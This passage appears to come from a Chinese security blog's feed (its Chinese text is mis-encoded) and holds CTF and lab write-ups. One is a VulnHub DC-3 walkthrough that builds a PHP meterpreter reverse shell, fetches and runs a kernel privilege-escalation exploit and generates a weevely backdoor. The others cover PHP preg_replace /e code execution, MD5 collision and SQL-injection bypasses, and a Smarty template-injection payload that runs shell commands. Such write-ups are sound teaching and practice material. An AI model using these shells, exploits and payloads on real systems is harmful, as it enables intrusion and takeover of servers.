style="zoom:80%;"><p>å‘ç°å¯ä»¥æ–°å»ºä¿®æ”¹æ–‡ä»¶ï¼Œç›´æ¥ç”¨msfç”Ÿæˆä¸€ä¸ªphpçš„meterpreter</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.17.146  -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206175355.png" style="zoom: 50%;"><p>è·¯å¾„ä½äº<code>/templates/beez3/shell.php</code>ï¼Œmsfç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.17.146</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®ï¼ŒæˆåŠŸæ‹¿åˆ°shell</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206180725.png" style="zoom: 80%;"><p>æ‹¿åˆ°çš„æ˜¯wwwæƒé™ï¼Œæƒ³åŠæ³•ææƒï¼Œè¿›å…¥shellï¼Œçœ‹ä¸‹ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯Ubuntu 16.04</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206182606.png" style="zoom:80%;"><p><code>searchsploit</code>æŸ¥æ‰¾ææƒæ¼æ´</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206232440.png" style="zoom:67%;"><p>é€‰æ‹©ç”¨è¿™ä¸ª<code>4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">unzip 39772.zip</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh<span class="comment">#ä¼šæŠ¥é”™ï¼Œå¿½ç•¥å°±è¡Œ</span></span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206234540.png" style="zoom:80%;"><p>å¾—åˆ°flag</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206234648.png" style="zoom:80%;"><p>ç”¨phpçš„meterpreteræ„Ÿè§‰çœŸçš„ä¸å¤ªå¥½ï¼Œä¸çŸ¥é“ä¸ºå•¥æ–­äº†å¥½å‡ æ¬¡</p><p>æ¨èä½¿ç”¨<code>weevely</code>ï¼Œç”¨æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate 1 a.php <span class="comment">#ç”Ÿæˆå¯†ç ä¸º1çš„phpåé—¨</span></span><br><span class="line">weevely http://127.0.0.1/a.php 1<span class="comment">#è¿æ¥</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_replaceä¸ä»£ç æ‰§è¡Œ</title>
      <link href="2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰è¿™ä¸ªçŸ¥è¯†ç‚¹ä¸çŸ¥é“ï¼Œè®°å½•ä¸€ä¸‹ï¼</p><a id="more"></a><h2 id="preg-replace-å‡½æ•°"><a href="#preg-replace-å‡½æ•°" class="headerlink" title="preg_replace()å‡½æ•°"></a>preg_replace()å‡½æ•°</h2><p>å…ˆçœ‹ä¸‹phpæ‰‹å†Œ</p><p><strong>å‡½æ•°è¯´æ˜ï¼š</strong>è¯¥å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="keyword">int</span> $limit = <span class="number">-1</span> [, <span class="keyword">int</span> &amp;$count ]] ) : mixed</span><br></pre></td></tr></table></figure><p>æœç´¢<code>subject</code>ä¸­åŒ¹é…<code>pattern</code>çš„éƒ¨åˆ†ï¼Œ ä»¥<code>replacement</code>è¿›è¡Œæ›¿æ¢ã€‚</p><p>å¯¹äºç¬¬äºŒä¸ªå‚æ•°ï¼Œphpæ‰‹å†Œä¸Šè¿™æ ·è¯´æ˜</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIMæˆªå›¾20200131122252.png" style="zoom: 80%;"><p>åœ¨æœ€åä¸€æ®µä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœåŠ ä¸Šeä¿®é¥°ç¬¦å°±å¯ä»¥å¯¼è‡´ä»£ç æ‰§è¡Œï¼Œæ³¨æ„è¿™ä¸ªæœ‰ç‰ˆæœ¬é™åˆ¶ï¼Œphp7ç‰ˆæœ¬å°†æ— æ³•æ‰§è¡Œ</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIMæˆªå›¾20200131124525.png" style="zoom:80%;"><h2 id="ä¸€ä¸ªç®€å•çš„ä¾‹å­"><a href="#ä¸€ä¸ªç®€å•çš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªç®€å•çš„ä¾‹å­"></a>ä¸€ä¸ªç®€å•çš„ä¾‹å­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/t/e&quot;</span>, $_GET[<span class="string">&quot;a&quot;</span>], <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIMæˆªå›¾20200131125938.png" style="zoom:80%;"><p>åœ¨php5.6æˆåŠŸæ‰§è¡Œå¦‚ä¸Šç»“æœï¼Œå‘ç°è¦æ›¿æ¢çš„<code>t</code>æœ‰ä¸¤ä¸ªä½ç½®ï¼Œ<code>var_dump(1)</code>å°±æ‰§è¡Œä¸¤æ¬¡ï¼Œå› æ­¤è¦æƒ³æ‰§è¡Œä»£ç ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¿…é¡»å­˜åœ¨ç¬¬ä¸€ä¸ªå‚æ•°æ­£åˆ™çš„å­—ç¬¦</p><h2 id="ä¸€é“CTFé¢˜ç›®"><a href="#ä¸€é“CTFé¢˜ç›®" class="headerlink" title="ä¸€é“CTFé¢˜ç›®"></a>ä¸€é“CTFé¢˜ç›®</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œè¿™é‡Œçš„<code>preg_replace</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å·²ç»å›ºå®šä¸º<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code> å­—ç¬¦ä¸²ï¼Œ<code>strtolower</code>å‡½æ•°çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™ï¼Œé‚£è¿™æ ·è¦å¦‚ä½•æ‰§è¡Œä»£ç å‘¢ï¼Ÿ</p><p>ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œï¼Œç›¸å½“äº<code>eval(&#39;strtolower(&quot;\\1&quot;);&#39;</code>) ç»“æœï¼Œå½“ä¸­çš„ <code>\\1</code> å®é™…ä¸Šå°±æ˜¯ <code>\1</code> ï¼Œè€Œ <code>\1</code> åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ã€‚</p><p><strong>åå‘å¼•ç”¨:</strong></p><p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ <strong>ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·</strong> å°†å¯¼è‡´ç›¸å…³ <strong>åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº</strong>ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p><p>æ‰€ä»¥è¿™é‡Œçš„<code>\\1</code>ä»£è¡¨çš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹ï¼Œä½†æ˜¯æœ‰æ­¤ä¹Ÿåªæ˜¯ä»…ä»…èƒ½æ‰§è¡Œå°†ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹å…¨éƒ¨å˜æˆå°å†™ï¼Œä¹Ÿæ— æ³•ä»£ç æ‰§è¡Œå•Šï¼Œè¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€ä¸‹<a href="https://www.php.net/manual/zh/language.variables.variable.php">phpå¯å˜å˜é‡</a>çš„æ¦‚å¿µï¼š</p><p><strong>åœ¨PHPä¸­åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ï¼Œè€Œå•å¼•å·åˆ™ä¸è¡Œ</strong></p><p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p><p>åŒå¼•å·ä¾‹å­ï¼Œå¯ä»¥çœ‹åˆ°phpinfoå·²ç»æˆåŠŸè§£æ</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIMæˆªå›¾20200131203850.png" style="zoom: 50%;"><p>å•å¼•å·ä¾‹å­ï¼Œphpinfoæ²¡èƒ½è§£æ</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIMæˆªå›¾20200131203924.png" style="zoom:80%;"><p>å‰é¢çš„<code>\\1</code>æ­£æ˜¯ä½äºåŒå¼•å·ä¸­ï¼Œå¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?.*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>ä½†è¿™æ˜¯è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œç”±äºphpå­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼Œ<code>.</code>ä¼šæ›¿æ¢æˆ<code>_</code>ï¼Œå…·ä½“å‚è§ï¼š<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>å¦‚æ­¤ï¼Œæˆ‘ä»¬æ„é€ çš„payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br><span class="line">æˆ–è€…</span><br><span class="line">?\S*=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>\S</code>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºä»»ä½•éç©ºç™½å­—ç¬¦ï¼Œç­‰ä»·äº <code>[^ \f\n\r\t\v]</code></p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIMæˆªå›¾20200131205759.png" style="zoom:80%;"><p>æ€»ä¹‹ï¼Œå‘å¾ˆå¤šï¼</p><p>åˆ†æä¸€ä¸‹ä»£ç æ‰§è¡Œçš„æµç¨‹ï¼Œ<code>$&#123;phpinfo()&#125;</code>ä¸­çš„ <code>phpinfo()</code>ä¼šè¢«å½“åšå˜é‡å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œåï¼Œå³å˜æˆ <code>$&#123;1&#125;</code> (phpinfo()æˆåŠŸæ‰§è¡Œè¿”å›true)</p><p>çœ‹å‡ ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(phpinfo()); <span class="comment">// å¸ƒå°”true</span></span><br><span class="line">var_dump(strtolower(phpinfo()));<span class="comment">// å­—ç¬¦ä¸²&#x27;1&#x27;,phpinfoæ‰§è¡ŒæˆåŠŸè¿”å›1ï¼Œå°†1å°å†™</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">//å­—ç¬¦ä¸²&#x27;11&#x27;</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// ç»“æœï¼šç©ºå­—ç¬¦ä¸²&#x27;&#x27;</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// ç»“æœï¼šç©ºå­—ç¬¦ä¸²&#x27;&#x27;</span></span><br><span class="line">è¿™é‡Œçš„<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>æ‰§è¡Œåç›¸å½“äº strtolower(<span class="string">&quot;<span class="subst">&#123;$&#123;1&#125;</span>&#125;&quot;</span>) åˆç›¸å½“äº strtolower(<span class="string">&quot;&#123;null&#125;&quot;</span>) åˆç›¸å½“äº <span class="string">&#x27;&#x27;</span> ç©ºå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020å¤ç°writeup</title>
      <link href="2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/"/>
      <url>2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†BGDCTF2020éƒ¨åˆ†é¢˜ç›®çš„writeupï¼</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œåœ¨httpå“åº”å¤´é‡Œæ‰¾åˆ°hint</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200129200528.png" style="zoom: 80%;"><p>å¾ˆç†Ÿæ‚‰ï¼Œç¬¬ä¸€æ—¶é—´çš„æˆ‘æ²¡æœ‰æƒ³åˆ°ï¼Œä¹‹å‰åšè¿‡ï¼Œå“ï¼<a href="https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login">https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login</a></p><p>ç›´æ¥æäº¤<code>ffifdyop</code>å°±è¡Œï¼ŒåŸå› ï¼š</p><p><strong>md5()å‡½æ•°</strong>æœ‰ä¸¤ä¸ªå‚æ•°</p><p>å‚æ•°ä¸€æ˜¯è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼›</p><p>å‚æ•°äºŒæ˜¯è¾“å‡ºæ ¼å¼ï¼šä¸ºtrueæ—¶ï¼Œè¡¨ç¤ºè¾“å‡ºåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›é»˜è®¤ä¸ºfalseï¼Œè¡¨ç¤ºè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚</p><p>å­—ç¬¦ä¸²<code>ffifdyop</code>MD5åŠ å¯†åå†è½¬æ¢æˆå­—ç¬¦ä¸²ä¸º<code>&#39;or&#39;6&lt;ä¹±ç &gt;</code>ï¼Œæ‹¼æ¥åçš„è¯­å¥ä¸ºï¼š<code>select * from admin where password=&#39;&#39;or&#39;6&lt;ä¹±ç &gt;&#39;</code> ï¼Œå°±ç›¸å½“äº<code>select * from admin where password=&#39;&#39;or 1</code> ,å®ç°sqlæ³¨å…¥</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200129202450.png" style="zoom:67%;"><p>ç„¶åè·³è½¬åˆ°å¦ä¸€ä¸ªç½‘é¡µï¼ŒæŸ¥çœ‹æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))</span><br></pre></td></tr></table></figure><p>ä¸¤ç§æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a[]&#x3D;1&amp;b[]&#x3D;&#x2F;&#x2F;æ•°ç»„çƒ§è¿‡</span><br><span class="line"></span><br><span class="line">levels91.php?a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a&#x2F;&#x2F;md5å¼±æ¯”è¾ƒ</span><br></pre></td></tr></table></figure><p>ç„¶ååˆè·³è½¬åˆ°å¦å¤–ä¸€ä¸ªç½‘é¡µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ä¸¤ç§æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">param1[]&#x3D;&amp;param2[]&#x3D;1&#x2F;&#x2F;æ•°ç»„ç»•è¿‡</span><br><span class="line"></span><br><span class="line">bpæŠ“åŒ…POST:</span><br><span class="line">param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200129212213.png" style="zoom:80%;"><h3 id="Mark-loves"><a href="#Mark-loves" class="headerlink" title="Mark loves"></a>Mark loves</h3><p>dirsearchæ‰«å‡ºæ¥gitæºç æ³„éœ²ï¼Œæ¢å¤å‡ºæ¥ï¼Œå¾—åˆ°:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//GETæ–¹å¼ä¼ flagåªèƒ½ä¼ ä¸€ä¸ªflag=flag</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;<span class="comment">//GETå’ŒPOSTå…¶ä¸­ä¹‹ä¸€å¿…é¡»ä¼ flag</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//GETå’ŒPOSTä¼ flag,å¿…é¡»ä¸èƒ½æ˜¯flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure><p>phpå¯å˜å˜é‡ï¼Œä»”ç»†åˆ†æä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥æ„é€ ä¸‹é¢çš„payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br><span class="line"><span class="comment">//è¿™æ ·çš„è¯ï¼Œç»è¿‡ç¬¬äºŒä¸ªforeachå¾ªç¯ï¼Œ$handsomeå°±ä¼šç­‰äº$flagï¼Œ$flagç­‰äº$handsomeä¼šä¸å˜ï¼Œç»è¿‡ç¬¬ä¸‰ä¸ªå¾ªç¯ç¬¬ä¸€æ¬¡éå†$_GET[&#x27;flag&#x27;]=&quot;handsome&quot;=$x=&quot;handsome&quot;!=&#x27;flag&#x27;ï¼Œé€€å‡ºè¾“å‡º$handsomeå³$flagçš„å€¼</span></span><br><span class="line"></span><br><span class="line">?yds=flag </span><br><span class="line"><span class="comment">//è¿™æ ·çš„è¯ï¼Œåœ¨ç»è¿‡ç¬¬äºŒä¸ªforeachå¾ªç¯æ—¶ï¼Œ$ydså°±ä¼šç­‰äº$flag,åœ¨ç»è¿‡ç¬¬ä¸‰ä¸ªforeachå¾ªç¯æ—¶ï¼Œæ²¡ä¼ flagç›´æ¥è·³è¿‡ï¼Œç„¶åifæ»¡è¶³æ¡ä»¶ï¼Œé€€å‡ºè¾“å‡º$ydså³$flag</span></span><br></pre></td></tr></table></figure><h3 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h3><p>çœŸæƒ³ä¸åˆ°æ˜¯SSTI,æŸ¥çœ‹å‘ç°XFFå¯æ§ï¼Œsmartyæ¨¡æ¿æ³¨å…¥payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200129222724.png" style="zoom:67%;"><h3 id="ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td 